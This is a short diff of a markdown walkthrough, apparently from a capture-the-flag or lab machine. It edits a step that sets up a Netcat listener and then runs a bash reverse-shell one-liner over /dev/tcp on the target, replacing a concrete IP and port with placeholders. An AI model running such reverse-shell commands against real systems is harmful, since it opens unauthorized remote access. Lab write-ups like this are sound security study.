@@ -66,7 +66,7 @@ session_start();
 ![critical](img/critical.png)
 - Now use **Netcat** to create a **Reverse Shell**
     - On our machine, run `nc -lvnp 4444`
-    - On target machine (os-shell), run `bash -c "bash -i >& /dev/tcp/10.10.14.147/434 0>&1"` 
+    - On target machine (os-shell), run `bash -c "bash -i >& /dev/tcp/[our-IP-Address]/[port] 0>&1"` 
     ![ev](img/rev.png)
 - Once connected, we can remotely excecute on the target machine. After wandering around, I found some file in `/var/www/html`
 ![cd](img/cd.png)
